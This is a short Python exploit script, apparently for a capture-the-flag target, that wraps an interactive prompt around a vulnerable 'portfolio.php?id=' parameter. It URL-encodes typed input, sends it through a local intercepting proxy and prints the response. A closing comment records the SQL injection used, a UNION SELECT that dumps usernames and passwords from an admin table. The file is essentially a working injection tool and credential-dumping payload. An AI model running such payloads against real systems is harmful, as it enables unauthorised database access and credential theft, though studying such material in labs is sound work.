import sys, cmd
import requests, urllib

BASE_URL = "http://167.99.88.216:31422/portfolio.php?id="
HEADERS = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"}

class Exploit(cmd.Cmd):

	prompt = "naiame > "

	def default(self, line):
		# payload = line.strip().replace(" ", "/**/")
		# print(payload)
		payload = urllib.parse.quote(line.strip())
		print(payload)
		r = requests.get(BASE_URL + payload, headers = HEADERS, proxies = {"http" : "http://127.0.0.1:8080"})
		print(f"[+] HEADERS :\n{r.headers}")
		print(f"[+] BODY :\n{r.headers}\n{r.text}")
		print(f"[+] INPUT : {line.strip()}")

	def do_exit(self, *args):
		return True

if "__main__" in __name__:
	Exploit().cmdloop()

# SQLI used
# 0 union select 1,group_concat(username,':',password),3 from freelancer.safeadmin